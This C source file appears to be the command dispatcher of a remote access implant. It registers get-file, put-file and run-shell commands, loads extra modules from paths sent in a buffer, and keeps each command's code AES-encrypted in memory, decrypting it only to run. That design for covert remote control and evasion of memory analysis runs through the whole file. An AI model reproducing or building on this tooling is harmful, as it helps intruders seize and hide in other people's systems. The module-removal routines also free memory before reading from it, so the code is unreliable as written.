#include "commands.h"

/// Defining the type command_type.
typedef buffer (*command_type)(result *, buffer *);

/**
 * The command_definition structure, defines a builtin command.
 */
typedef struct command_definition_s {
    /// The address (entrypoint) of the command.
    command_type command_address;

    /// The start address of the command's section.
    const unsigned char *command_start_address;

    /// The end address of the command's section.
    const unsigned char *command_end_address;

    /// The ID of the command.
    uint64_t command_id;
} command_definition;

/**
 * The module_command_definition structure, defines a module command.
 * Implemented as a linked list to allow easy addition and removal of module commands.
 */
typedef struct module_command_definition_s {
    /// The command's definition.
    command_definition command_definition;

    /// The handle of the shared object where the module command is loaded from.
    void *library_handle;

    /// The module's destructor.
    void (*module_destructor)();

    /// The next module command.
    struct module_command_definition_s *next_module_command;
} module_command_definition;

/// The builtin commands.
command_definition *commands = NULL;

/// The module commands.
module_command_definition *module_commands = NULL;

/// The number of builtin commands.
size_t commands_number = 0;

result initialize_commands() {
    INITIALIZE_RESULT(res);

    // Allocate memory for the builtin commands.
    commands = (command_definition *) malloc_f(sizeof(command_definition) * 3);
    if (commands == NULL) {
        HANDLE_ERROR(res, FAILED_MALLOC, "Failed allocating commands", NULL)
    }

    // Set the definitions for the builtin commands.

    // Get file.
    extern unsigned char *__get_file_start;
    extern unsigned char *__get_file_end;
    commands[0] = (command_definition) {
            .command_address = get_file,
            .command_start_address = (const unsigned char *) &__get_file_start,
            .command_end_address = (const unsigned char *) &__get_file_end,
            .command_id = GET_FILE_COMMAND_ID
    };

    // Put file.
    extern unsigned char *__put_file_start;
    extern unsigned char *__put_file_end;
    commands[1] = (command_definition) {
            .command_address = put_file,
            .command_start_address = (const unsigned char *) &__put_file_start,
            .command_end_address = (const unsigned char *) &__put_file_end,
            .command_id = PUT_FILE_COMMAND_ID
    };

    // Run shell.
    extern unsigned char *__run_shell_start;
    extern unsigned char *__run_shell_end;
    commands[2] = (command_definition) {
            .command_address = run_shell,
            .command_start_address = (const unsigned char *) &__run_shell_start,
            .command_end_address = (const unsigned char *) &__run_shell_end,
            .command_id = RUN_SHELL_COMMAND_ID
    };

    // Set the number of builtin commands.
    commands_number = 3;

    WRITE_LOG(DEBUG, "Initialized commands", NULL)

    goto cleanup;

    error_cleanup:

    // Destroy the builtin commands.
    destroy_commands();

    cleanup:

    return res;
}

result
add_module_command(const char *module_path, const char *function_name, uint64_t function_size, uint64_t command_id) {
    INITIALIZE_RESULT(res);

    result (*module_constructor)() = NULL;
    void (*module_destructor)() = NULL;
    buffer (*chosen_command)(result *, buffer *) = NULL;

    WRITE_LOG(DEBUG, "Adding module command: %s:%s, id: 0x%08llx", module_path, function_name, command_id)

    // Get a handle for the shared object.
    void *handle = dlopen(module_path, RTLD_LAZY);
    if (handle == NULL) {
        HANDLE_ERROR(res, FAILED_DLOPEN, "Failed opening shared object", NULL)
    }

    // Get the addresses of the module_constructor and module_destructor symbols.
    module_constructor = dlsym(handle, string_module_constructor);
    module_destructor = dlsym(handle, string_module_destructor);

    // Call the module's constructor.
    res = module_constructor();
    HANDLE_ERROR_RESULT(res)

    // Get the address of the module command.
    chosen_command = dlsym(handle, function_name);
    if (chosen_command == NULL) {
        HANDLE_ERROR(res, FAILED_DLSYM, "Failed loading symbol %s", function_name)
    }

    // Allocate memory for the module command's definition.
    module_command_definition *new_module = malloc_f(sizeof(module_command_definition));
    if (new_module == NULL) {
        HANDLE_ERROR(res, FAILED_MALLOC, "Failed allocating new module", NULL)
    }

    // Set the module command's definition.
    *new_module = (module_command_definition) {
            .command_definition=(command_definition) {
                    .command_address=chosen_command,
                    .command_start_address=(const unsigned char *) chosen_command,
                    .command_end_address=(const unsigned char *) chosen_command + function_size,
                    .command_id=command_id
            },
            .library_handle=handle,
            .module_destructor=module_destructor,
            .next_module_command=module_commands};

    // Add the definition to the start of the module commands' definitions linked list.
    module_commands = new_module;

    WRITE_LOG(DEBUG, "Added module command: %s:%s, id: 0x%08llx", module_path, function_name, command_id)

    goto cleanup;

    error_cleanup:

    // Call the module's destructor.
    if (module_destructor != NULL) {
        module_destructor();
    }

    // Close the handle to the shared object.
    if (handle != NULL) {
        dlclose(handle);
    }

    cleanup:

    return res;
}

result add_module_command_from_buffer(buffer *buf) {
    INITIALIZE_RESULT(res);

    // Read all the arguments for the add_module_command function.
    unsigned int module_path_length = read_unsigned_int(&res, buf);
    HANDLE_ERROR_RESULT(res)
    const char *module_path = read_string(&res, buf, module_path_length);
    HANDLE_ERROR_RESULT(res)
    unsigned int function_name_length = read_unsigned_int(&res, buf);
    HANDLE_ERROR_RESULT(res)
    const char *function_name = read_string(&res, buf, function_name_length);
    HANDLE_ERROR_RESULT(res)
    uint64_t function_size = read_uint64_t(&res, buf);
    HANDLE_ERROR_RESULT(res)
    uint64_t command_id = read_uint64_t(&res, buf);
    HANDLE_ERROR_RESULT(res)

    // Call add_module_command with the arguments from the buffer.
    res = add_module_command(module_path, function_name, function_size, command_id);
    HANDLE_ERROR_RESULT(res)

    error_cleanup:

    return res;
}

/**
 * Round a number upwards (aka. ceil).
 *
 * @param num       The number to round.
 * @param multiple  The jumps to round the number to.
 * @return  The rounded up number.
 */
size_t round_up(size_t num, size_t multiple) {
    return ((num / multiple) + (num % multiple ? 1 : 0)) * multiple;
}

/**
 * Round a number downwards (aka. floor).
 *
 * @param num       The number to round.
 * @param multiple  The jumps to round the number to.
 * @return  The rounded down number.
 */
size_t round_down(size_t num, size_t multiple) {
    return (num / multiple) * multiple;
}

result
xcrypt_command(const char *key, const char *iv, const unsigned char *start_address, const unsigned char *end_address) {
    INITIALIZE_RESULT(res);
    struct AES_ctx command_ctx;

    // Initialize the AES CTR context.
    AES_init_ctx_iv(&command_ctx, (const uint8_t *) key, (const uint8_t *) iv);

    // Get the system's page size.
    size_t pagesize = sysconf_f(_SC_PAGE_SIZE);
    if (pagesize == -1) {
        HANDLE_ERROR(res, FAILED_SYSCONF, "Failed getting page size", NULL)
    }

    // Get the start address of the first page containing the command's code and the size of the pages containing the
    // command's code.
    void *start_address_p = (void *) round_down((size_t) start_address, pagesize);
    size_t section_size = round_up((size_t) end_address, pagesize) - round_down((size_t) start_address, pagesize);

    // Change the pages' containing the command's code protection to allow writing.
    if (mprotect_f(start_address_p, section_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    // Xcrypt the command's code in memory.
    AES_CTR_xcrypt_buffer(&command_ctx, (uint8_t *) start_address, end_address - start_address);

    // Change back the pages' protection.
    if (mprotect_f(start_address_p, section_size, PROT_READ | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res;
}

buffer run_command(result *res, uint64_t command_id, const char *key, const char *iv, buffer *buf) {
    WRITE_LOG(INFO, "Running command: 0x%08llx", command_id)

    INITIALIZE_BUFFER(buf_out);
    INITIALIZE_RESULT(tmp_res);

    command_definition *chosen_command = NULL;

    // Search the command ID in the builtin commands.
    for (size_t command_index = 0; command_index < commands_number; command_index++) {
        if (command_id == commands[command_index].command_id) {
            chosen_command = &commands[command_index];
            break;
        }
    }

    // If was not found in the builtin commands, search in the module commands.
    if (chosen_command == NULL) {
        module_command_definition *chosen_module_command;
        for (chosen_module_command = module_commands;
             chosen_module_command != NULL; chosen_module_command = chosen_module_command->next_module_command) {
            if (command_id == chosen_module_command->command_definition.command_id) {
                chosen_command = &chosen_module_command->command_definition;
                break;
            }
        }
    }

    // Could not find the command ID.
    if (chosen_command == NULL) {
        HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: 0x%08llx", command_id)
    }

    // Decrypt the command's code.
    *res = xcrypt_command(key, iv, chosen_command->command_start_address, chosen_command->command_end_address);
    HANDLE_ERROR_RESULT((*res))

    // Run the command.
    buf_out = chosen_command->command_address(res, buf);
    HANDLE_ERROR_RESULT((*res))

    WRITE_LOG(INFO, "Finished running command: 0x%08llx", command_id)

    goto cleanup;

    error_cleanup:

    destroy_buffer(&buf_out);

    cleanup:

    // Encrypt the command's code.
    if (chosen_command != NULL) {
        tmp_res = xcrypt_command(key, iv, chosen_command->command_start_address, chosen_command->command_end_address);
        if (RESULT_SUCCEEDED((*res))) {
            *res = tmp_res;
        }
    }

    return buf_out;
}

result remove_module_command(uint64_t command_id) {
    INITIALIZE_RESULT(res);

    // Search the command ID in the module commands.
    module_command_definition **chosen_module_command;
    for (chosen_module_command = &module_commands;
         *chosen_module_command != NULL; chosen_module_command = &(*chosen_module_command)->next_module_command) {
        if (command_id == (*chosen_module_command)->command_definition.command_id) {
            break;
        }
    }

    // Could not find the command ID.
    if (*chosen_module_command == NULL) {
        HANDLE_ERROR(res, UNKNOWN_COMMAND, "Unknown module command: 0x%08llx", command_id)
    }

    // Call the module destructor, close the handle to the shared object, and free the module command's structure.
    (*chosen_module_command)->module_destructor();
    dlclose((*chosen_module_command)->library_handle);
    free_f(*chosen_module_command);

    // Remove the command from the linked list.
    *chosen_module_command = (*chosen_module_command)->next_module_command;

    WRITE_LOG(DEBUG, "Removed module command: 0x%08llx", command_id)

    goto cleanup;

    error_cleanup:

    cleanup:

    return res;
}

result remove_module_command_from_buffer(buffer *buf) {
    INITIALIZE_RESULT(res);

    // Read all the arguments for the remove_module_command function.
    uint64_t command_id = read_uint64_t(&res, buf);
    HANDLE_ERROR_RESULT(res)

    // Call remove_module_command with the arguments from the buffer.
    res = remove_module_command(command_id);
    HANDLE_ERROR_RESULT(res)

    error_cleanup:

    return res;
}

void destroy_module_commands() {
    // Iterate the module commands and remove them.
    module_command_definition **position = &module_commands;
    while (*position != NULL) {
        module_command_definition **tmp_module_command = &(*position)->next_module_command;

        // Call the module destructor, close the handle to the shared object, and free the module command's structure.
        (*position)->module_destructor();
        dlclose((*position)->library_handle);
        free_f(*position);
        position = tmp_module_command;
    }

    // Reset to initial value.
    module_commands = NULL;

    WRITE_LOG(DEBUG, "Destroyed modules", NULL)
}

void destroy_commands() {
    // Free the commands' structures, and reset to initial values.
    free_f(commands);
    commands = NULL;
    commands_number = 0;

    WRITE_LOG(DEBUG, "Destroyed commands", NULL)
}
